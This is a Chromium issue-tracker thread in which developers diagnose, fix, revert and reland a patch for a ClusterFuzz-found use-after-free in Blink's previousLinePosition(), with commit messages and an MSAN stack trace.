Minimized Testcase (1.35 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97asDCUq2RimsxZVciA-qIJ-lWFZMqbqU3ZepFMHH3x8tRVEwDWS-kfinqw3LcuXDnFfBe8SuGbueNB5hk9jhwFha-b8hQ6K2QcWFkeq4laVW5RrfJZvKzHXKXBuBz7ToEHGE0AhYAj8rFd4VdGKo5ltrHgNQ

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### cl...@chromium.org (2016-06-12)

[Empty comment from Monorail migration]

### ko...@chromium.org (2016-06-13)

[Empty comment from Monorail migration]

### yo...@chromium.org (2016-06-13)

Since, previousLinePosition() calls Document::updateStyleAndLayoutIgnorePendingStylesheets() at entry then use RootInlineBox, it seems RootInlineBox is corrupted.


[Monorail components: -Blink>Editing Blink>TextSelection]

### ko...@chromium.org (2016-06-13)

Still haven't determined who this belongs to.

position.m_anchorNode points to <keygen> in line 1319 of previousLinePosition
https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/editing/VisibleUnits.cpp?q=previousLinePosition&sq=package:chromium&dr=CSs&l=1319

and then editing grabs deleted RootInlineBox from somewhere I haven't figured out yet.

Then the crash in debug build is FrameView::synchronizedPaint() tries to move from LayoutClean to InPaint. Probably unrelated, we're just writing to random memory somewhere.

### ko...@chromium.org (2016-06-16)

Debug crash occurs both on Win/Linux, this is a violation of document lifecycle.

The use-after-free only occurs on Linux ASAN, which looks strange. I set a flag in InlineBox::~InlineBox but non-ASAN builds look fine, both on Win/Linux. This is hard to track down.

### ko...@chromium.org (2016-06-17)

yosin@, back to you ;)

|root| is valid at the beginning of the line:
  root->closestLeafChildForPoint(pointInLine, isEditablePosition(p))
https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/editing/VisibleUnits.cpp?q=previousLinePosition&sq=package:chromium&dr=CSs&l=1385

However, |isEditablePosition()| calls:
  node->document().updateStyleAndLayoutIgnorePendingStylesheets()
https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/editing/EditingUtilities.cpp?sq=package:chromium&dr=CSs&rcl=1466119491&l=271

This deletes |root|, and hence use-after-free.

The fix is don't update layout tree while you keep pointers to LineLayoutItem, but I hope you have better idea how to fix that in this scenario.

### yo...@chromium.org (2016-06-17)

Since previousLinePostion doesn't modify between L1353 (updateLayout) and L1385 (isEditablePosition => updateLayout), layout tree should not be updated at L1385.

It is strange that second call of updateStyleAndLayoutIgnorePendingStylesheets() to modify layout tree.


### ko...@chromium.org (2016-06-17)

I haven't investigated where in the code setNeedsLayout(), but the rule of thumb is that:
a. don't keep LineLayoutItem/LayoutObject across the call to updateStyleAndLayoutIgnorePendingStylesheets(), or
b. don't call updateStyleAndLayoutIgnorePendingStylesheets() if you don't want layout tree to change.

I see isEditablePosition() has a flag to do so, so you're explicitly asking to update layout tree if dirty.

Maybe someone setNeedsLayout() is another bug, and this issue can be fixed by fixing it. But regardless of that, calling updateStyleAndLayoutIgnorePendingStylesheets() and keeps LayoutObject from before the call is really a bad practice which could break anytime. Any new code may setNedsLayout(), and it makes us hard to find the culprit.

If you have a case where the first updateStyleAndLayoutIgnorePendingStylesheets() doesn't update the layout tree and need to make another call, that's likely a layout bug, please assign it to me.

### ko...@chromium.org (2016-06-17)

BTW, I added |updateStyleAndLayoutIgnorePendingStylesheets()| multiple times in L1353 but this still occurs, so it's not the function returns without doing layout. Someone between the two lines do something that needs layout tree changes. Maybe pending style sheet in L1353 became not-pending in L1385.

But again, regardless of that, let's not call updateLayout() there, that code worries me. Happy to drop by if you need further assistance when you're back to Tokyo.

### ko...@chromium.org (2016-06-17)

The problem looks like it started with this CL in 2012:
https://chromium.googlesource.com/chromium/src/+/33a3a50a0d70c0e701a93c4875d50cd36c5b759f%5E%21/

The description says |isEditablePosition| needs to update layout in very exceptional case, but made it default.

I hope 4 years later now, we should have better idea to fix the original issue.

### bu...@chromium.org (2016-06-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/fb81c66590538c2487a34b8623066a22d0b27dff

commit fb81c66590538c2487a34b8623066a22d0b27dff
Author: yosin <yosin@chromium.org>
Date: Wed Jun 22 08:41:17 2016

Make previousLinePosition() not to use dangling RootInlineBox

This patch makes |previousLinePosition()| not to use dangling |RootInlineBox|
pointer to avoid use-after-free.

Before this patch, |isEditablePosition()| is called with |DoUpdateStyle|
parameter to update layout tree if needed. Usually, layout tree isn't updated
by this |isEditablePosition()| call since |previousLinePosition()| updates
layout tree at entry. However, if there are pending style sheet, e.g. @import
directive, and HTML import, e.g link rel=import, layout tree is updated since
document isn't rendering ready, |haveImportLoaded()| &&
|haveRenderBlockingStyleSheetsLoaded()|.

BUG=618237
TEST=LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html

Review-Url: https://codereview.chromium.org/2082893005
Cr-Commit-Position: refs/heads/master@{#401231}

[add] https://crrev.com/fb81c66590538c2487a34b8623066a22d0b27dff/third_party/WebKit/LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html
[modify] https://crrev.com/fb81c66590538c2487a34b8623066a22d0b27dff/third_party/WebKit/Source/core/editing/VisibleUnits.cpp


### yo...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-06-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f60b4eb00abc12a1fa2575890f7c77b373a1bedc

commit f60b4eb00abc12a1fa2575890f7c77b373a1bedc
Author: dgozman <dgozman@chromium.org>
Date: Wed Jun 22 17:10:53 2016

Revert of Make previousLinePosition() not to use dangling RootInlineBox (patchset #1 id:1 of https://codereview.chromium.org/2082893005/ )

Reason for revert:
New test editing/selection/modify_move/move_backward_line_import_crash.html fails on WebKit Linux MSAN.

Dashboard:
https://test-results.appspot.com/dashboards/flakiness_dashboard.html#tests=editing%2Fselection%2Fmodify_move%2Fmove_backward_line_import_crash.html&testType=webkit_tests

First failed build:
https://build.chromium.org/p/chromium.webkit/builders/WebKit%20Linux%20MSAN/builds/10718

Original issue's description:
> Make previousLinePosition() not to use dangling RootInlineBox
>
> This patch makes |previousLinePosition()| not to use dangling |RootInlineBox|
> pointer to avoid use-after-free.
>
> Before this patch, |isEditablePosition()| is called with |DoUpdateStyle|
> parameter to update layout tree if needed. Usually, layout tree isn't updated
> by this |isEditablePosition()| call since |previousLinePosition()| updates
> layout tree at entry. However, if there are pending style sheet, e.g. @import
> directive, and HTML import, e.g link rel=import, layout tree is updated since
> document isn't rendering ready, |haveImportLoaded()| &&
> |haveRenderBlockingStyleSheetsLoaded()|.
>
> BUG=618237
> TEST=LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html
>
> Committed: https://crrev.com/fb81c66590538c2487a34b8623066a22d0b27dff
> Cr-Commit-Position: refs/heads/master@{#401231}

TBR=yoichio@chromium.org,yosin@chromium.org
# Skipping CQ checks because original CL landed less than 1 days ago.
NOPRESUBMIT=true
NOTREECHECKS=true
NOTRY=true
BUG=618237

Review-Url: https://codereview.chromium.org/2084913005
Cr-Commit-Position: refs/heads/master@{#401319}

[delete] https://crrev.com/192d78833ff9297c754f59f20cb4e590d693a7c2/third_party/WebKit/LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html
[modify] https://crrev.com/f60b4eb00abc12a1fa2575890f7c77b373a1bedc/third_party/WebKit/Source/core/editing/VisibleUnits.cpp


### cl...@chromium.org (2016-06-22)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Request-XX label, where XX is the Chrome milestone.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-06-22)

ClusterFuzz has detected this issue as fixed in range 401117:401251.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5033339291697152

Uploader: nparker@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x6110000933a0
Crash State:
  blink::RootInlineBox::closestLeafChildForPoint
  blink::previousLinePosition
  blink::SelectionModifier::modifyMovingBackward
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=325152:325175
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=401117:401251

Minimized Testcase (1.35 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97asDCUq2RimsxZVciA-qIJ-lWFZMqbqU3ZepFMHH3x8tRVEwDWS-kfinqw3LcuXDnFfBe8SuGbueNB5hk9jhwFha-b8hQ6K2QcWFkeq4laVW5RrfJZvKzHXKXBuBz7ToEHGE0AhYAj8rFd4VdGKo5ltrHgNQ?testcase_id=5033339291697152

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### pd...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### aa...@google.com (2016-06-22)

[Empty comment from Monorail migration]

### yo...@chromium.org (2016-06-23)

MSAN log:

crash log for renderer (pid <unknown>):
STDOUT: #CRASHED - renderer
STDERR: ==4==WARNING: MemorySanitizer: use-of-uninitialized-value
STDERR:     #0 0x103f123e in canShapeWordByWord third_party/WebKit/Source/platform/fonts/Font.cpp:450:9
STDERR:     #1 0x104711bb in CachingWordShapeIterator third_party/WebKit/Source/platform/fonts/shaping/CachingWordShapeIterator.h:55:33
STDERR:     #2 0x104711bb in width third_party/WebKit/Source/platform/fonts/shaping/CachingWordShaper.cpp:44:0
STDERR:     #3 0x103eebea in floatWidthForComplexText third_party/WebKit/Source/platform/fonts/Font.cpp:733:26
STDERR:     #4 0x103eebea in width third_party/WebKit/Source/platform/fonts/Font.cpp:237:0
STDERR:     #5 0x86d5777 in computeTextHeight third_party/WebKit/Source/core/layout/LayoutMenuList.cpp:178:26
STDERR:     #6 0x86d5777 in updateOptionsHeightWidth third_party/WebKit/Source/core/layout/LayoutMenuList.cpp:168:0
STDERR:     #7 0x86d9ed6 in computeIntrinsicLogicalWidths third_party/WebKit/Source/core/layout/LayoutMenuList.cpp:283:5
STDERR:     #8 0x84564ed in computePreferredLogicalWidths third_party/WebKit/Source/core/layout/LayoutBlock.cpp:1253:9
STDERR:     #9 0x851982a in minPreferredLogicalWidth third_party/WebKit/Source/core/layout/LayoutBox.cpp:1029:39
STDERR:     #10 0x850ebe4 in computeLogicalWidthUsing third_party/WebKit/Source/core/layout/LayoutBox.cpp:2325:25
STDERR:     #11 0x8533f01 in computeLogicalWidth third_party/WebKit/Source/core/layout/LayoutBox.cpp:2229:37
STDERR:     #12 0x8532075 in updateLogicalWidth third_party/WebKit/Source/core/layout/LayoutBox.cpp:2136:5
STDERR:     #13 0x843e4f8 in updateLogicalWidthAndColumnWidth third_party/WebKit/Source/core/layout/LayoutBlock.cpp:397:5
STDERR:     #14 0x85bc69e in layoutBlock third_party/WebKit/Source/core/layout/LayoutFlexibleBox.cpp:332:9
STDERR:     #15 0x843e0c1 in layout third_party/WebKit/Source/core/layout/LayoutBlock.cpp:366:5
STDERR:     #16 0x84e8e6e in layoutIfNeeded third_party/WebKit/Source/core/layout/LayoutObject.h:900:13
STDERR:     #17 0x84e8e6e in layoutInlineChildren third_party/WebKit/Source/core/layout/LayoutBlockFlowLine.cpp:1600:0
STDERR:     #18 0x8470fcb in layoutBlockFlow third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:483:9
STDERR:     #19 0x846ecf2 in layoutBlock third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:390:16
STDERR:     #20 0x843e0c1 in layout third_party/WebKit/Source/core/layout/LayoutBlock.cpp:366:5
STDERR:     #21 0x84763d4 in positionAndLayoutOnceIfNeeded third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:668:11
STDERR:     #22 0x84774ee in layoutBlockChild third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:718:30
STDERR:     #23 0x848c248 in layoutBlockChildren third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1203:9
STDERR:     #24 0x8471055 in layoutBlockFlow third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:485:9
STDERR:     #25 0x846ecf2 in layoutBlock third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:390:16
STDERR:     #26 0x843e0c1 in layout third_party/WebKit/Source/core/layout/LayoutBlock.cpp:366:5
STDERR:     #27 0x84763d4 in positionAndLayoutOnceIfNeeded third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:668:11
STDERR:     #28 0x84774ee in layoutBlockChild third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:718:30
STDERR:     #29 0x848c248 in layoutBlockChildren third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1203:9
STDERR:     #30 0x8471055 in layoutBlockFlow third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:485:9
STDERR:     #31 0x846ecf2 in layoutBlock third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:390:16
STDERR:     #32 0x843e0c1 in layout third_party/WebKit/Source/core/layout/LayoutBlock.cpp:366:5
STDERR:     #33 0x84763d4 in positionAndLayoutOnceIfNeeded third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:668:11
STDERR:     #34 0x84774ee in layoutBlockChild third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:718:30
STDERR:     #35 0x848c248 in layoutBlockChildren third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1203:9
STDERR:     #36 0x8471055 in layoutBlockFlow third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:485:9
STDERR:     #37 0x846ecf2 in layoutBlock third_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:390:16
STDERR:     #38 0x843e0c1 in layout third_party/WebKit/Source/core/layout/LayoutBlock.cpp:366:5
STDERR:     #39 0x889562e in layoutContent third_party/WebKit/Source/core/layout/LayoutView.cpp:185:22
STDERR:     #40 0x889562e in layout third_party/WebKit/Source/core/layout/LayoutView.cpp:285:0
STDERR:     #41 0x7882a6b in layoutFromRootObject third_party/WebKit/Source/core/frame/FrameView.cpp:830:10
STDERR:     #42 0x7882a6b in performLayout third_party/WebKit/Source/core/frame/FrameView.cpp:899:0
STDERR:     #43 0x7879dda in layout third_party/WebKit/Source/core/frame/FrameView.cpp:1052:9
STDERR:     #44 0x5df1d7d in updateStyleAndLayout third_party/WebKit/Source/core/dom/Document.cpp:1884:20
STDERR:     #45 0x5df195b in updateStyleAndLayoutIgnorePendingStylesheets third_party/WebKit/Source/core/dom/Document.cpp:1971:5
STDERR:     #46 0x748bc25 in canonicalPosition<blink::PositionTemplate<EditingStrategy> > third_party/WebKit/Source/core/editing/VisibleUnits.cpp:106:26
STDERR:     #47 0x748bc25 in canonicalPositionOf third_party/WebKit/Source/core/editing/VisibleUnits.cpp:162:0
STDERR:     #48 0x74744ec in create third_party/WebKit/Source/core/editing/VisiblePosition.cpp:63:53
STDERR:     #49 0x7475611 in createVisiblePosition third_party/WebKit/Source/core/editing/VisiblePosition.cpp:115:12
STDERR:     #50 0x7475611 in createVisiblePosition third_party/WebKit/Source/core/editing/VisiblePosition.cpp:110:0
STDERR:     #51 0x746ee0c in visibleStart third_party/WebKit/Source/core/editing/VisibleSelection.h:81:69
STDERR:     #52 0x746ee0c in modify third_party/WebKit/Source/core/editing/SelectionModifier.cpp:538:0
STDERR:     #53 0x74184c8 in modify third_party/WebKit/Source/core/editing/FrameSelection.cpp:625:45
STDERR:     #54 0x503208f in modifyMethod ./out/Release/gen/blink/bindings/core/v8/V8Selection.cpp:555:11
STDERR:     #55 0x503208f in modifyMethodCallback ./out/Release/gen/blink/bindings/core/v8/V8Selection.cpp:561:0
STDERR:     #56 0x2214c7a in Call v8/src/api-arguments.cc:19:3
STDERR:     #57 0x2403a71 in HandleApiCallHelper v8/src/builtins.cc:5203:36
STDERR:     #58 0x24d9fac in Builtin_Impl_HandleApiCall v8/src/builtins.cc:5220:3
STDERR:     #59 0x47c1a5c in DoRuntimeCall v8/src/arm64/simulator-arm64.cc:610:27
STDERR:     #60 0x47bea1f in ExecuteInstruction v8/src/arm64/simulator-arm64.h:315:5
STDERR:     #61 0x47bea1f in Run v8/src/arm64/simulator-arm64.cc:446:0
STDERR:     #62 0x47bea1f in CheckPCSComplianceAndRun v8/src/arm64/simulator-arm64.cc:252:0
STDERR:     #63 0x47bea1f in CallVoid v8/src/arm64/simulator-arm64.cc:162:0
STDERR:     #64 0x47bf37c in CallInt64 v8/src/arm64/simulator-arm64.cc:169:3
STDERR:     #65 0x47bf37c in CallJS v8/src/arm64/simulator-arm64.cc:194:0
STDERR:     #66 0x328fb07 in Invoke v8/src/execution.cc:98:13
STDERR:     #67 0x328ee0e in Call v8/src/execution.cc:154:10
STDERR:     #68 0x2245b0a in Run v8/src/api.cc:1837:23
STDERR:     #69 0x4da1fdd in runCompiledScript third_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:414:26
STDERR:     #70 0x4c524b1 in executeScriptAndReturnValue third_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:164:21
STDERR:     #71 0x4c58ac3 in evaluateScriptInMainWorld third_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:415:35
STDERR:     #72 0x4c59174 in executeScriptInMainWorld third_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:393:5
STDERR:     #73 0x60e380a in executeScript third_party/WebKit/Source/core/dom/ScriptLoader.cpp:430:21
STDERR:     #74 0x60daa0b in prepareScript third_party/WebKit/Source/core/dom/ScriptLoader.cpp:277:14
STDERR:     #75 0x68f7302 in runScript third_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:423:23
STDERR:     #76 0x68f6398 in execute third_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:276:5
STDERR:     #77 0x688140e in runScriptsForPausedTreeBuilder third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:260:25
STDERR:     #78 0x688140e in processParsedChunkFromBackgroundParser third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:471:0
STDERR:     #79 0x6879ac0 in pumpPendingSpeculations third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:528:36
STDERR:     #80 0x776a698 in checkNotify third_party/WebKit/Source/core/fetch/Resource.cpp:350:12
STDERR:     #81 0x776ced3 in finish third_party/WebKit/Source/core/fetch/Resource.cpp:415:5
STDERR:     #82 0x77a3d99 in didFinishLoading third_party/WebKit/Source/core/fetch/ResourceFetcher.cpp:926:19
STDERR:     #83 0x1eba579 in OnCompletedRequest content/child/web_url_loader_impl.cc:764:16
STDERR:     #84 0x1e20049 in OnRequestComplete content/child/resource_dispatcher.cc:379:9
STDERR:     #85 0x1e27257 in DispatchToMethodImpl<content::ResourceDispatcher *, void (content::ResourceDispatcher::*)(int, const content::ResourceRequestCompletionStatus &), int, content::ResourceRequestCompletionStatus, 0, 1> base/tuple.h:126:3
STDERR:     #86 0x1e27257 in DispatchToMethod<content::ResourceDispatcher *, void (content::ResourceDispatcher::*)(int, const content::ResourceRequestCompletionStatus &), int, content::ResourceRequestCompletionStatus> base/tuple.h:133:0
STDERR:     #87 0x1e27257 in DispatchToMethod<content::ResourceDispatcher, void (content::ResourceDispatcher::*)(int, const content::ResourceRequestCompletionStatus &), void, std::__1::tuple<int, content::ResourceRequestCompletionStatus> > ipc/ipc_message_templates.h:26:0
STDERR:     #88 0x1e27257 in Dispatch<content::ResourceDispatcher, content::ResourceDispatcher, void, void (content::ResourceDispatcher::*)(int, const content::ResourceRequestCompletionStatus &)> ipc/ipc_message_templates.h:121:0
STDERR:     #89 0x1e170ef in DispatchMessage content/child/resource_dispatcher.cc:510:5
STDERR:     #90 0x1e14b80 in OnMessageReceived content/child/resource_dispatcher.cc:126:3
STDERR:     #91 0x102929e7 in Run<std::__1::unique_ptr<blink::WebTaskRunner::Task, std::__1::default_delete<blink::WebTaskRunner::Task> > > base/bind_internal.h:160:12
STDERR:     #92 0x102929e7 in MakeItSo<base::internal::RunnableAdapter<void (*)(std::__1::unique_ptr<blink::WebTaskRunner::Task, std::__1::default_delete<blink::WebTaskRunner::Task> >)> &, std::__1::unique_ptr<blink::WebTaskRunner::Task, std::__1::default_delete<blink::WebTaskRunner::Task> > > base/bind_internal.h:312:0
STDERR:     #93 0x102929e7 in Run base/bind_internal.h:364:0
STDERR:     #94 0xc2a26df in Run base/callback.h:397:12
STDERR:     #95 0xc2a26df in RunTask base/debug/task_annotator.cc:51:0
STDERR:     #96 0x102b8514 in ProcessTaskFromWorkQueue components/scheduler/base/task_queue_manager.cc:289:19
STDERR:     #97 0x102b27ae in DoWork components/scheduler/base/task_queue_manager.cc:201:13
STDERR:     #98 0xc2a26df in Run base/callback.h:397:12
STDERR:     #99 0xc2a26df in RunTask base/debug/task_annotator.cc:51:0
STDERR:     #100 0xc0b1601 in RunTask base/message_loop/message_loop.cc:493:19
STDERR:     #101 0xc0b3047 in DeferOrRunPendingTask base/message_loop/message_loop.cc:502:5
STDERR:     #102 0xc0b4a77 in DoWork base/message_loop/message_loop.cc:624:13
STDERR:     #103 0xc0c0c9a in Run base/message_loop/message_pump_default.cc:33:31
STDERR:     #104 0xc13b50c in Run base/run_loop.cc:35:10
STDERR:     #105 0xc0ae8f2 in ?? base/message_loop/message_loop.cc:295:12
STDERR:     #106 0x94c994f in RendererMain content/renderer/renderer_main.cc:197:37
STDERR:     #107 0xa5bd275 in RunZygote content/app/content_main_runner.cc:343:14
STDERR:     #108 0xa5c02cf in RunNamedProcessTypeMain content/app/content_main_runner.cc:426:12
STDERR:     #109 0xa5c3617 in Run content/app/content_main_runner.cc:785:12
STDERR:     #110 0xa5bb9e0 in ContentMain content/app/content_main.cc:20:28
STDERR:     #111 0x4ab900 in main content/shell/app/shell_main.cc:48:10
STDERR:     #112 0x7f30b0d3f76c in __libc_start_main /build/eglibc-rrybNj/eglibc-2.15/csu/libc-start.c:226:0
STDERR:     #113 0x443518 in _start ??:0
STDERR: 
STDERR:   Uninitialized value was created by a heap allocation
STDERR:     #0 0x467f42 in malloc ??:0
STDERR:     #1 0x8a4300a in partitionAllocGenericFlags third_party/WebKit/Source/wtf/allocator/PartitionAlloc.h:736:20
STDERR:     #2 0x8a4300a in partitionAllocGeneric third_party/WebKit/Source/wtf/allocator/PartitionAlloc.h:763:0
STDERR:     #3 0x8a4300a in fastMalloc third_party/WebKit/Source/wtf/allocator/Partitions.h:110:0
STDERR:     #4 0x8a4300a in operator new third_party/WebKit/Source/wtf/RefCounted.h:153:0
STDERR:     #5 0x8a4300a in create third_party/WebKit/Source/core/style/StyleInheritedData.h:39:0
STDERR:     #6 0x8a4300a in init third_party/WebKit/Source/core/style/DataRef.h:50:0
STDERR:     #7 0x8a4300a in ComputedStyle third_party/WebKit/Source/core/style/ComputedStyle.cpp:147:0
STDERR:     #8 0x8a4300a in createInitialStyle third_party/WebKit/Source/core/style/ComputedStyle.cpp:90:0
STDERR:     #9 0x8a40dbb in mutableInitialStyle third_party/WebKit/Source/core/style/ComputedStyle.h:354:9
STDERR:     #10 0x8a40dbb in initialStyle third_party/WebKit/Source/core/style/ComputedStyle.h:362:0
STDERR:     #11 0x8a40dbb in ComputedStyle third_party/WebKit/Source/core/style/ComputedStyle.cpp:113:0
STDERR:     #12 0x8a40dbb in create third_party/WebKit/Source/core/style/ComputedStyle.cpp:85:0
STDERR:     #13 0x732db3a in styleForDocument third_party/WebKit/Source/core/css/resolver/StyleResolver.cpp:679:43
STDERR:     #14 0x5df6c42 in attach third_party/WebKit/Source/core/dom/Document.cpp:2110:28
STDERR:     #15 0x78fd169 in installNewDocument third_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:363:17
STDERR:     #16 0x7d9f5eb in createWriterFor third_party/WebKit/Source/core/loader/DocumentLoader.cpp:664:51
STDERR:     #17 0x7d9f0c1 in ensureWriter third_party/WebKit/Source/core/loader/DocumentLoader.cpp:460:16
STDERR:     #18 0x7d98a52 in commitData third_party/WebKit/Source/core/loader/DocumentLoader.cpp:468:5
STDERR:     #19 0x7d982e9 in finishedLoading third_party/WebKit/Source/core/loader/DocumentLoader.cpp:290:13
STDERR:     #20 0x7da0c37 in maybeLoadEmpty third_party/WebKit/Source/core/loader/DocumentLoader.cpp:614:5
STDERR:     #21 0x7da0f72 in startLoadingMainResource third_party/WebKit/Source/core/loader/DocumentLoader.cpp:625:9
STDERR:     #22 0x7dfeec6 in init third_party/WebKit/Source/core/loader/FrameLoader.cpp:205:34
STDERR:     #23 0x10b4be5b in init third_party/WebKit/Source/core/frame/LocalFrame.h:232:14
STDERR:     #24 0x10b4be5b in initializeCoreFrame third_party/WebKit/Source/web/WebLocalFrameImpl.cpp:1501:0
STDERR:     #25 0x92e2872 in CreateMainFrame content/renderer/render_frame_impl.cc:919:27
STDERR:     #26 0x940b0e1 in Initialize content/renderer/render_view_impl.cc:758:26
STDERR:     #27 0x9417bfe in ?? content/renderer/render_view_impl.cc:1160:16
STDERR:     #28 0x93f17ca in DispatchToMethodImpl<content::RenderThreadImpl *, void (content::RenderThreadImpl::*)(const ViewMsg_New_Params &), ViewMsg_New_Params, 0> base/tuple.h:126:3
STDERR:     #29 0x93f17ca in DispatchToMethod<content::RenderThreadImpl *, void (content::RenderThreadImpl::*)(const ViewMsg_New_Params &), ViewMsg_New_Params> base/tuple.h:133:0
STDERR:     #30 0x93f17ca in DispatchToMethod<content::RenderThreadImpl, void (content::RenderThreadImpl::*)(const ViewMsg_New_Params &), void, std::__1::tuple<ViewMsg_New_Params> > ipc/ipc_message_templates.h:26:0
STDERR:     #31 0x93f17ca in Dispatch<content::RenderThreadImpl, content::RenderThreadImpl, void, void (content::RenderThreadImpl::*)(const ViewMsg_New_Params &)> ipc/ipc_message_templates.h:121:0
STDERR:     #32 0x93eeaa5 in OnControlMessageReceived content/renderer/render_thread_impl.cc:1686:5
STDERR:     #33 0x1d1f198 in OnMessageReceived content/child/child_thread_impl.cc:668:18
STDERR: 
STDERR: SUMMARY: MemorySanitizer: use-of-uninitialized-value (/b/build/slave/WebKit_Linux_MSAN/build/src/out/Release/content_shell+0x103f123e)
STDERR: Exiting
STDERR: #EOF

### yo...@chromium.org (2016-06-23)

It seems following member variables in Font aren't initialize by default ctor:
    mutable unsigned m_canShapeWordByWord : 1;
    mutable unsigned m_shapeWordByWordComputed : 1;
Fix in http://crrev.com/2091633002


### ko...@chromium.org (2016-06-23)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-06-23)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges.

- Your friendly ClusterFuzz

### bu...@chromium.org (2016-06-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2217e8c563575ead5c9450408529340ec93ccef7

commit 2217e8c563575ead5c9450408529340ec93ccef7
Author: yosin <yosin@chromium.org>
Date: Thu Jun 23 09:41:03 2016

Make default constructor of Font class to initialize all member variables

This patch makes default constructor of |Font| class to initialize
|m_canShapeWordByWord| and |m_shapeWordByWordComputed| member variables to
make MSAN happy.

This patch is a preparation of re-landing http://crrev.com/2082893005, which
is revered by uninitialized member variables of |Font|.

BUG=618237, 622566
TEST=n/a; MSAN will check this

Review-Url: https://codereview.chromium.org/2091633002
Cr-Commit-Position: refs/heads/master@{#401567}

[modify] https://crrev.com/2217e8c563575ead5c9450408529340ec93ccef7/third_party/WebKit/Source/platform/fonts/Font.cpp


### bu...@chromium.org (2016-06-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e9c943f368d15bbfe414aedf5e001792257f3eeb

commit e9c943f368d15bbfe414aedf5e001792257f3eeb
Author: yosin <yosin@chromium.org>
Date: Thu Jun 23 11:31:57 2016

Make previousLinePosition() not to use dangling RootInlineBox

This patch makes |previousLinePosition()| not to use dangling |RootInlineBox|
pointer to avoid use-after-free.

Before this patch, |isEditablePosition()| is called with |DoUpdateStyle|
parameter to update layout tree if needed. Usually, layout tree isn't updated
by this |isEditablePosition()| call since |previousLinePosition()| updates
layout tree at entry. However, if there are pending style sheet, e.g. @import
directive, and HTML import, e.g link rel=import, layout tree is updated since
document isn't rendering ready, |haveImportLoaded()| &&
|haveRenderBlockingStyleSheetsLoaded()|.

BUG=618237
TEST=LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html

Committed: https://crrev.com/fb81c66590538c2487a34b8623066a22d0b27dff
Review-Url: https://codereview.chromium.org/2082893005
Cr-Original-Commit-Position: refs/heads/master@{#401231}
Cr-Commit-Position: refs/heads/master@{#401581}

[add] https://crrev.com/e9c943f368d15bbfe414aedf5e001792257f3eeb/third_party/WebKit/LayoutTests/editing/selection/modify_move/move_backward_line_import_crash.html
[modify] https://crrev.com/e9c943f368d15bbfe414aedf5e001792257f3eeb/third_party/WebKit/Source/core/editing/VisibleUnits.cpp


### dd...@apple.com (2016-06-24)

Philip, thanks for the CC (via Hotlist-WebKit)!  Turns out this issue doesn't affect WebKit trunk, but I appreciate the head's up.


### sh...@chromium.org (2016-06-25)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-27)

[Automated comment] There appears to be on-going work (i.e. bugroid changes), needs manual review.

### go...@chromium.org (2016-06-27)

Before we approve merge to M52, Could you please confirm whether this change is baked/verified in Canary and safe to merge?

Also is this change applicable to all OS or any specific OS?

### aw...@chromium.org (2016-07-08)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-07-14)

